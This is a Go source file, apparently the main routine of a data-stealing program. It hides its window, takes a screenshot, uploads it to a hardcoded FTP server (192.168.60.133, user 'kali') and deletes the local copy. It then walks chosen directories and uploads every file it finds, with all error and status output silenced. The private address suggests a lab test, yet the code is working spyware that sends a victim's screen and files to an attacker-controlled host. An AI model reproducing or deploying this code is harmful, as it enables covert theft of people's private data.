package main

import (
	"os"
	"path/filepath"
)

// Recursively scan the folder without including subdirectory
func listFilesInDir(dirPath string) ([]string, error) {
	var files []string
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			files = append(files, path) // Store file in array and used for future operation
		}
		return nil
	})
	if err != nil {
		return nil, err
	}
	return files, nil
}

func main() {

	Hide()

	//Take screenshot
	screenshotPath := "screenshot.png" // Where save the screenshot
	err := CaptureScreenshot(screenshotPath)
	if err != nil {
		//log.Fatalf("Error capturing screenshot: %v", err)
	}

	// Get directory from "directory.go"
	directories, err := GetDirectories()
	if err != nil {
		//log.Fatalf("Error retrieving directories: %v", err)
	}

	// FTP configuration
	ftpServer := "192.168.60.133"
	ftpPort := 21
	ftpUser := "kali"
	ftpPassword := "qwerty1234"

	// Call to FTP connection function
	ftpClient, err := ConnectToFTP(ftpServer, ftpPort, ftpUser, ftpPassword)
	if err != nil {
		//log.Fatalf("Error connecting to FTP: %v", err)
	}
	defer ftpClient.Quit()

	// Load screenshot
	remotePath := filepath.Base(screenshotPath)
	err = UploadFileToFTP(ftpClient, screenshotPath, remotePath)
	if err != nil {
		//log.Fatalf("Failed to upload screenshot: %v", err)
	}

	// Delete screenshot from computer
	err = os.Remove(screenshotPath)
	if err != nil {
		//log.Fatalf("Failed to delete local screenshot: %v", err)
	}

	// Explore directory and upload file
	for _, dir := range directories {
		files, err := listFilesInDir(dir)
		if err != nil {
			//log.Printf("Error scanning directory %s: %v\n", dir, err)
			continue
		}

		for _, file := range files {
			remotePath := filepath.Base(file) // Only file name, change if needed structure
			err := UploadFileToFTP(ftpClient, file, remotePath)
			if err != nil {
				//log.Printf("Failed to upload file %s: %v\n", file, err)
			} else {
				//fmt.Printf("Successfully uploaded %s\n", file)
			}
		}
	}

	/*fmt.Println("File upload completed.")
	fmt.Println("Press any key to close...")
	fmt.Scanln()*/ //Uncomment during debug testing
	defer ftpClient.Quit()
}
